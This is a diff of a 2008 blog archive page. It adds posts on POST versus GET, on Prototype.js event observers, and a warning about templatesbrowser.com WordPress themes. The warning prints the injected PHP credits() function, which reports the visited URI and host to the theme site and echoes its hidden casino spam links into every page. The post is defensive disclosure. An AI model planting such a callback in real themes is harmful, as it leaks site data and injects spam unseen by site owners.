@@ -7,7 +7,10 @@
 	<meta name="author" content="Michael Sharman">
 
 	
-	<meta name="description" content="I&#8217;ve been reading about Mylyn for a little while now but haven&#8217;t had the opportunity to install it. After reading this post today from &hellip;">
+	<meta name="description" content="Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source: 1
+2
+3
+var CCounter=2151068; &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -81,6 +84,384 @@
 
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes/">
+		
+			Don&#8217;t Ever User www.templatesbrowser.com for Wordpress Themes</a>
+	</h2>
+	<div class="entry-content">
+		<p>Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">nosc</span><span class="o">/</span><span class="nx">ript</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">hreflang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&quot;de&quot;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://www.portalux.com/&quot;</span><span class="o">&gt;</span><span class="nx">online</span> <span class="nx">casino</span><span class="o">&lt;</span><span class="err">/a&gt;&lt;/nosc/ript&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">CCounter</span><span class="o">=</span><span class="mi">2151068</span><span class="p">;</span> <span class="kd">var</span> <span class="nx">CCsite</span><span class="o">=</span><span class="nx">www</span><span class="p">.</span><span class="nx">chapter31</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">CCinvisible</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>My investigations found that where I downloaded the template from was a nice (NOT) little site called <a href="http://www.templatesbrowser.com/wordpress-themes/">http://www.templatesbrowser.com/</a>. Now what they do is add a &#8220;functions.php&#8221; file in the original code base, then call a method from the footer &#8220;credits();&#8221; which is in the functions.php file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">credits</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="nx">$url</span> <span class="o">=</span> <span class="s2">&quot;http://get.templatesbrowser.com/wp.php?&quot;</span> <span class="p">.</span>
+</span><span class='line'>       <span class="s2">&quot;url=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="p">.</span> <span class="s2">&quot;&amp;&quot;</span> <span class="p">.</span> <span class="s2">&quot;host=&quot;</span> <span class="p">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]);</span>
+</span><span class='line'> <span class="nx">$check</span> <span class="o">=</span> <span class="err">@</span><span class="nx">fsockopen</span><span class="p">(</span><span class="s2">&quot;get.templatesbrowser.com&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="nx">$check</span><span class="p">)</span>
+</span><span class='line'> <span class="p">{</span>
+</span><span class='line'>  <span class="err">@</span><span class="nx">readfile</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">fclose</span><span class="p">(</span><span class="nx">$check</span><span class="p">);</span>
+</span><span class='line'> <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">?&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>More information was found from <a href="http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress">www.onnoot.com/</a>:</p>
+
+<blockquote><p>This produces a link at the bottom of every WordPress page, that is invisible for human readers.</p>
+
+<p>Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google&#8217;s search result pages.</p></blockquote>
+
+<p>So for those who don&#8217;t know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-24T15:43:02+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/misc/'>Misc</a>, <a class='category' href='/categories/php/'>php</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes//page/16/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/24/when-to-use-form-post-vs-get/">
+		
+			When to Use Form POST vs GET?</a>
+	</h2>
+	<div class="entry-content">
+		<p>I read <a href="http://www.coldfusionmuse.com/index.cfm/2008/1/23/web.logs.security">a post</a> today from <a href="http://www.coldfusionmuse.com/">Mark Kruger</a> where he was warning against the possible side effects when using GET as a form submit <em>method</em>.</p>
+
+<p>I think I (unintentionally) offended Mark with my comment where I asked <em>why would anyone EVER use GET?</em> because I pretty much always use POST so was wondering why you would use GET.</p>
+
+<p>In my search for answers I asked <a href="http://www.lynchconsulting.com.au/">Mark Lynch</a> who seems to always have the answer to my questions :)</p>
+
+<p>So in summary (from <a href="http://weblogs.asp.net/mschwarz/archive/2006/12/04/post-vs-get.aspx">Michael Schwarz</a>);</p>
+
+<blockquote><p>POST</p>
+
+<ol>
+<li>By default no proxy server or web browser is caching this data, you will always get the real data from you web server.</li>
+<li>The length of data you can send to the web server is only restricted by the web server itself, but there is no real restriction.</li>
+<li>Character encoding can be done easily using application/x-www-form-urlencoded.</li>
+</ol>
+
+
+<p>GET</p>
+
+<ol>
+<li>Running a http request with GET can be cached on your web browser or a configured proxy server.</li>
+<li>To get the live data from you web server you have to modify the url that is used in your XHR invoke, simply by using a counter or new Date().getTime() which will generate a unique url.</li>
+<li>Maximum URL length is 2,083 characters in Internet Explorer (see MaxClientRequestBuffer: Use POST instead of GET to Send Large Amounts of Data in Request)</li>
+<li>In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. [RFC 2616 sec 9]</li>
+<li>Character encoding will reduce the amount of data that can be used because of url encoding entities (i.e. three Japanese characters are converted to this: %26%2312454%3B%26%2312455%3B%26%2312502%3B)</li>
+</ol>
+</blockquote>
+
+<p>There is also a <a href="http://www.cs.tut.fi/~jkorpela/forms/methods.html">great article here</a> if you want some further reading on this subject.</p>
+
+<p>For me (at this stage) this really only has an effect when doing Ajax. If I&#8217;m purely wanting to retrieve data (just HTML for example) from the server then I&#8217;ll use GET, but if I want to do something else with server <em>side effects</em> (such as posting data to be saved to a database) then I&#8217;ll use POST.</p>
+
+<p>Phew&#8230;you learn something new everyday!</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-24T14:01:30+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/x-html/'>(X)HTML</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/24/when-to-use-form-post-vs-get//page/16/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/2008/01/23/taking-advantage-of-dom-on-ready-and-event-observers-using-prototypejs/">
+		
+			Taking Advantage of DOM on Ready and Event Observers Using Prototype.js</a>
+	</h2>
+	<div class="entry-content">
+		<p>I&#8217;ve been doing some JavaScript development with <a href="http://www.prototypejs.org/">Prototype</a> over the last few days and it&#8217;s been interesting trying to do things that I know how to do in <a href="http://www.jquery.com/">jQuery</a>, but in Prototype.</p>
+
+<p>One of the cool things I like with all these JavaScript frameworks is the easy way they allow you to execute code on &#8216;DOM Ready&#8217; (once the page markup has completed but before all the images etc have loaded). I like this as it lets you get a lot of the grunt work and page initialisation out of the way before the user would notice the result of your code, such as hiding page elements etc</p>
+
+<p>Anyway, here is how you can set this up using Prototype. Add this to your &lt;script&gt; tag or hopefully better still in an external .js file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c1">//any code here will be read once the DOM is ready, nice and early!</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another way to do this is using the Event model to call a separate function to handle your initialisation code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span> <span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="nx">init</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="c1">//initialise code</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now another cool thing about these frameworks is they give you the ability to register &#8220;listeners&#8221; for user events. This way I can have my HTML markup completely free of <em>event code</em> like &#8220;onclick&#8221; or &#8220;onsubmit&#8221; etc which is great for users with JavaScript turned off as it clearly degrades nice and cleanly, but I can setup listeners in my external .js files to handle these events.</p>
+
+<p>So to handle a form submission I might have the following HTML form:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;frmAddLink&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;frmAddLink&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;/?event=links/create&quot;</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c">&lt;!--</span> <span class="nx">form</span> <span class="nx">controls</span> <span class="nx">here</span> <span class="o">--&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="err">/form&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And my JavaScript will be:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">,</span> <span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">submitForm</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This basically says whenever the form with an ID of &#8220;frmAddLink&#8221; is submitted&#8230;execute the function called &#8220;submitForm&#8221; (which can of course be any function you like).</p>
+
+<p>An &#8220;event&#8221; container is automatically made available to the &#8220;submitForm&#8221; as an argument where I can serialize my form data, setup form &#8220;action&#8221; URL&#8217;s etc and submit asynchronously. Again, no JavaScript in your markup is good and degrades easily :)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">submitForm</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">Event</span><span class="p">.</span><span class="nx">stop</span><span class="p">(</span><span class="nx">event</span><span class="p">);</span> <span class="c1">//Stops the eventâ€™s propagation and prevents its default action from being triggered eventually.</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">element</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">element</span><span class="p">();</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">sAction</span> <span class="o">=</span> <span class="nx">element</span><span class="p">.</span><span class="nx">action</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">stForm</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">id</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>   <span class="c1">//serialise the form for posting</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">new</span> <span class="nx">Ajax</span><span class="p">.</span><span class="nx">Request</span><span class="p">(</span><span class="nx">sAction</span><span class="p">,{</span>
+</span><span class='line'>      <span class="nx">parameters</span><span class="o">:</span> <span class="nx">stForm</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;get&#39;</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">onSuccess</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">transport</span><span class="p">){</span>
+</span><span class='line'>          <span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">transport</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">||</span> <span class="s2">&quot;no response text&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;myEl&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">},</span>
+</span><span class='line'>      <span class="nx">onFailure</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Something went wrong...&#39;</span><span class="p">)</span> <span class="p">}</span>
+</span><span class='line'>  <span class="p">});</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One problem though is if you load a page on your site where the form in question doesn&#8217;t exist, you will get an error where your Observer is being registered because it can&#8217;t find the element in the DOM and Prototype isn&#8217;t a &#8220;fail silently&#8221; framework.</p>
+
+<p>To get around this I do the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">?</span> <span class="s2">&quot;&quot;</span> <span class="o">:</span> <span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">,</span> <span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">submitForm</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This simply says if the element &#8220;frmAddLink&#8221; exists register an observer; else do nothing.</p>
+
+<h3>UPDATE 24th Jan</h3>
+
+<p>After asking a question on the Prototype mailing list, the following is &#8220;best practise&#8221; when looking for elements which might not be on every page:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">el</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>      
+</span><span class='line'>  <span class="nx">el</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">showElement</span><span class="p">);</span>
+</span><span class='line'>  <span class="c1">//etc</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first line will have a value of NULL if the element &#8220;frmAddLink&#8221; isn&#8217;t defined in the markup. This is also a better way as you can have multiple statements instead of just one observe, handy if you want to do more things on &#8216;submit&#8217;.</p>
+
+<h3>UPDATE 2nd Feb</h3>
+
+<p>Thanks to Dr J in the comments of this post where he advised that I actually was using the wrong syntax for dom:loaded. I had the equivalent of window.onLoad() by using the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This of course not the best as you need to wait for the entire page to load before your JavaScripts are run. The updated way (dom:loaded) is much nicer :)</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2008-01-23T21:44:59+11:00" pubdate data-updated="true">Jan 23<span>rd</span>, 2008</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/categories/javascript/'>Javascript</a>
+
+
+</div>
+	
+		<div class="comments"><a href="/2008/01/23/taking-advantage-of-dom-on-ready-and-event-observers-using-prototypejs//page/16/index.html#disqus_thread">Comments</a></div>
+	
+</div></article>
 
 
     <article class="post">
@@ -671,210 +1052,6 @@ I&#8217;ve been annoyed many times with the whole chr(10)chr(13) on Windows vs c
 	
 </div></article>
 
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2007/11/01/coldfusion-8-can-now-use-cacheaftercachewithin-when-using-cfqueryparams/">
-		
-			ColdFusion 8 Can Now Use cacheAfter/cacheWithin When Using Cfqueryparam&#8217;s</a>
-	</h2>
-	<div class="entry-content">
-		<p>I just noticed this in the <a href="http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=Tags_p-q_18.html">Adobe docs</a> for cfqueryparam in ColdFusion 8:</p>
-
-<blockquote><p>Revised 8/21/2007: Removed limitation on using the cfquery cachedAfter or cachedWithin attributes with cfqueryparam.This limit no longer applies.</p></blockquote>
-
-<p>This is great news because before (MX7 and below):</p>
-
-<blockquote><p>You cannot use the cfquery cachedAfter or cachedWithin attributes with cfqueryparam.</p></blockquote>
-
-<p>I know many people didn&#8217;t like this limitation as it meant you needed to go to extra lengths to perform query caching (such as Application scope etc).</p>
-
-<p>This is another reason why CF8 is so good :)</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2007-11-01T09:19:48+11:00" pubdate data-updated="true">Nov 1<span>st</span>, 2007</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2007/11/01/coldfusion-8-can-now-use-cacheaftercachewithin-when-using-cfqueryparams//page/16/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2007/10/18/styling-issues-when-generating-an-xls-from-html/">
-		
-			Styling Issues When Generating an Xls From HTML</a>
-	</h2>
-	<div class="entry-content">
-		<p>A few notes to self on generating .xls files from HTML tables, particularly with CSS.</p>
-
-<p>It appears that excel only has a particular &#8216;range&#8217; of hex numbers you can use (at least for background colours). I was trying to use #eeeeee; for a while (which is obviously fine for HTML and for creating a PDF), but I couldn&#8217;t use that as a value in excel as the colours just weren&#8217;t displaying. Perhaps the colour was too close to white?</p>
-
-<p>In any event, once I chose a darker colour (#bbbbbb) the background colour appeared fine!</p>
-
-<p>Another issue was that HTML allows you to specifiy multiple CSS classes such as:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">table</span><span class="o">&gt;</span>
-</span><span class='line'>  <span class="o">&lt;</span><span class="nx">thead</span><span class="o">&gt;</span>
-</span><span class='line'>      <span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;</span>
-</span><span class='line'>          <span class="o">&lt;</span><span class="nx">th</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&quot;sortOpt1 highlight&quot;</span><span class="o">&gt;</span><span class="nx">STUDIO</span><span class="o">&lt;</span><span class="err">/th&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This wasn&#8217;t working for me, so for that <th> I added an inline style:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">table</span><span class="o">&gt;</span>
-</span><span class='line'>  <span class="o">&lt;</span><span class="nx">thead</span><span class="o">&gt;</span>
-</span><span class='line'>      <span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;</span>
-</span><span class='line'>          <span class="o">&lt;</span><span class="nx">th</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&quot;sortOpt1&quot;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;background-color:##bbbbbb;&quot;</span><span class="o">&gt;</span><span class="nx">STUDIO</span><span class="o">&lt;</span><span class="err">/th&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If anyone is interested in the code to actually launch the open/save dialogue window, here it is:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">cfheader</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;Content-Disposition&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;attachment; filename=studioDailyReport_#dateFormat(now(), &#39;yyyymmdd&#39;)#.xls&quot;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">cfcontent</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;application/msexcel&quot;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="c">&lt;!--</span><span class="o">-</span> <span class="nx">output</span> <span class="nx">HTML</span> <span class="nx">data</span> <span class="nx">here</span> <span class="o">---&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2007-10-18T11:31:16+10:00" pubdate data-updated="true">Oct 18<span>th</span>, 2007</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2007/10/18/styling-issues-when-generating-an-xls-from-html//page/16/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/2007/10/12/coldfusion-round-docs-inaccurate/">
-		
-			ColdFusion &#8216;Round()&#8217; Docs Inaccurate?</a>
-	</h2>
-	<div class="entry-content">
-		<p>Today I needed a function which would return me a whole number, rounding either up or down depending on whether the value passed to the function was less than or greater than .5</p>
-
-<p>Looking at <a href="http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=functions_m-r_40.html">round() ColdFusion 8 docs</a> they say:</p>
-
-<blockquote><p>Rounds a number to the closest integer that is larger than the input parameter.</p></blockquote>
-
-<p>Hmm, that doesn&#8217;t sound right.</p>
-
-<p>In actual fact the round() function does exactly what it should, rounds numbers down OR up.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="mf">7.49</span><span class="p">)</span> <span class="o">=</span> <span class="mi">7</span>
-</span><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="mf">7.5</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
-</span><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="mf">7.65</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
-</span><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="o">-</span><span class="mf">7.49</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">7</span>
-</span><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="o">-</span><span class="mf">7.5</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">7</span>
-</span><span class='line'><span class="nx">Round</span><span class="p">(</span><span class="o">-</span><span class="mf">7.65</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
